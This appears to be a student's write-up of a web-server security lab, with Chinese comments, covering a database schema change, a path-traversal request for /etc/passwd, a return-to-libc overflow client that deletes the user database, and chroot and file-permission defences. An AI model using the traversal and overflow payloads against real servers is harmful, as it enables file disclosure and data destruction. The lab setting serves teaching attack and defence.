#exercise 1

![](http://i12.tietuku.com/cdb74f9f85e0fa69.png)

#exercise 2

在init_db()函数中添加如下代码即可在数据库中添加address信息
```c
void init_db()
{	
  if(open_db()==SUCCESS){
	  //first call opendb
 //if user table is not exists,this sql could be useful,or useless!!!so wo first drop table user
    char* sql = "CREATE TABLE IF NOT EXISTS user(\
			id INTEGER PRIMARY KEY,	 \
                    	name VARCHAR(50),	 \
                    	passwd VARCHAR(50),	 \
			address VARCHAR(50)      \
        	    )";
//define a string whinch is used to handle db
    
    handle_db(db,sql);//handle
    sqlite3_close(db);//colse db
    
  }	
}
```
![](http://i12.tietuku.com/035ced388c812138.png)
#exercise 3
browswe的请求改成如下即可得到password
```c
char *req ="GET ../../../../../../../etc/passwd HTTP/1.1\r\n\r\n";
```
![](http://i12.tietuku.com/41bd8187932dcba8.png)

#exercise 4
在server.c中添加如下代码，我们可以发现/etc/passwd访问不了了
```c
chroot("/jail");
//改变根目录位 “/jail”
chdir("/");
//改变当前目录位 "/"(此“/”实际为“/jail”)
```

![](http://i12.tietuku.com/faa735ceae60200c.png)

#exercise 4
通过gdb获取unlink的地址，和缓冲区的地址
![](http://i12.tietuku.com/bdfdf0f61c25853e.png)

攻击代码如下
```c
/*
    below show that client send a normal request to the web server
    you should fix the code to realize your attack
  */
  
 int i;
 char attack_req[1080];
 long *retaddr=(long *)attack_req;
 //讲unlink所需要的参数写如栈中
for(i=0;i<1064;i++)
{
	attack_req[i++]='d';
	attack_req[i++]='b';
	attack_req[i++]='/';
	attack_req[i++]='u';
	attack_req[i++]='s';
	attack_req[i++]='e';
	attack_req[i++]='r';
	attack_req[i++]='s';
	attack_req[i++]='.';
	attack_req[i++]='d';
	attack_req[i++]='b';
	attack_req[i]='\0';
}


  retaddr[266]=0xb7ef12e0;//unlink 的地址
  retaddr[268]=0xbfffee94;//unlink 参数的地址
  attack_req[269*4]='\r';
  attack_req[269*4+1]='\n';
  attack_req[269*4+2]='\r';
  attack_req[269*4+3]='\n';
  write(sock_client,attack_req,1080);
```

#exercise 6
因为httpd拥有root权限，所以我们可以通过ret-to-libc删除db文件，我们只需要设置httpd和db为不同的uid
并且使只有文件的拥有者才能操作文件，就可以防止通过httpd来攻击服务器
```c
#fill in your commands here
chown -R 1001:1001 /jail/db #db 属于fivesv
chown -R 1000:1000 /jail/index.html
chmod -R 4711 /jail/
```
并且在service.c中设置fivesv和httpd，banksv的uid
![](http://i12.tietuku.com/9c8595411d72f2e3.png)